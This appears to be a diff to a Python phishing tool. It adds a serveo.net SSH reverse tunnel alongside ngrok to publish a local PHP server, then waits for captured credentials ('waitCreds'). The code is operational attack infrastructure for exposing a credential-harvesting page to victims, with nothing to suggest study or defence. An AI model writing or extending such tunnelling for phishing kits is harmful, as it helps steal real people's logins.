@@ -284,9 +284,30 @@ def runNgrok():
     url = open('ngrok.url', 'r')
     print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
     url.close()
+    
+def serveo():
+    system('ssh -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
+    sleep(4)
+    f = open('sendlink.txt', 'r')
+    a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
+    lst = []
+    for line in f:
+    	for word in a:
+            if word in line:
+            	line = line.replace(word,'')	    	
+    	lst.append(line)
+    f.close()
+    f = open('sendlink.txt','w')
+    for line in lst:
+    	f.write(line)
+    f.close()
+    url = open('sendlink.txt', 'r')    
+    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
+    url.close()
+    system('rm sendlink.txt')    
 
 def runServer():
-    system("cd Server/www/ && sudo php -S 127.0.0.1:1111")
+    system("cd Server/www/ && sudo php -n -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
 
 
@@ -294,6 +315,7 @@ if __name__ == "__main__":
     try:
         runPEnv()
         runNgrok()
+        serveo()
         multiprocessing.Process(target=runServer).start()
         waitCreds()
 
@@ -302,5 +324,6 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         system('pkill -f ngrok')
+        system('pkill -f ssh')
         end()
         exit(0)
